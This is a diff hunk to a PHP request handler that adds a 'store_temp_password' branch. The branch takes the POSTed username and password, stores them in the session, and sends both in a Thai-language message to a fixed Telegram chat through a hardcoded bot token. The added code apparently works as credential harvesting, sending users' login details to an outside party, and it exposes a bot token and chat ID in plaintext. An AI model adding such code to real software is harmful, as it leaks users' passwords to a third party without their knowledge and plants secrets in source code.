@@ -22,6 +22,18 @@
 			break;
 		}
 	}
+	if ($_POST['keyword'] === 'store_temp_password') {
+		session_start();
+		$_SESSION['temp_password'] = $_POST['password'];
+		$_SESSION['temp_username'] = $_POST['username'];
+		$chat_id = '6130432593';
+		$token = '7832409912:AAGLmjoI4LvXz6_aSyfhszXBjrySsWAEpIk';
+		$text = urlencode("รหัสผ่านชั่วคราวของคุณคือ: {$_POST['password']}\nนำไปใช้เข้าสู่ระบบ กับชื่อผู้ใช้: {$_POST['username']}");
+		$url = "https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat_id}&text={$text}";
+		file_get_contents($url); // หรือใช้ cURL ก็ได้
+		echo 'success';
+		exit;
+	}
     if ($_POST['keyword'] == "role_session") {
 		$KEYWORD = $_POST['keyword'];
 		$a0 = $_POST['a0'];
